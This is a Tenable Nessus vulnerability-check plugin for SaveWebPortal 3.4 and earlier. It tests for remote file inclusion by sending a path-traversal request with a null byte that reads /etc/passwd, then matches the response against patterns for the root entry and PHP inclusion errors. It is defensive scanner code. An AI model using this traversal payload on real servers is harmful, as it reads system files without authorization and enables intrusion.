#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running SaveWebPortal, a PHP web portal
application. 

The installed version of SaveWebPortal is prone to multiple
vulnerabilities, including remote code execution, arbitrary file
inclusion, and cross-site scripting. 

See also : 

http://retrogod.altervista.org/save_yourself_from_savewebportal34.html

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19604);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(14639, 14641, 14642, 14643);

  name["english"] = "SaveWebPortal <= 3.4 Multiple Vulnerabilities";
  script_name(english:name["english"]);

  script_description(english:desc["english"]);

  summary["english"] = "Checks for SaveWebportal arbitrary file inclusion";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


 # Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/menu_dx.php?",
      "SITE_Path=../../../../../../../../../../etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.*: *main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.*: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc["english"];

    security_warning(port:port, data:report);
    exit(0);
  }
}
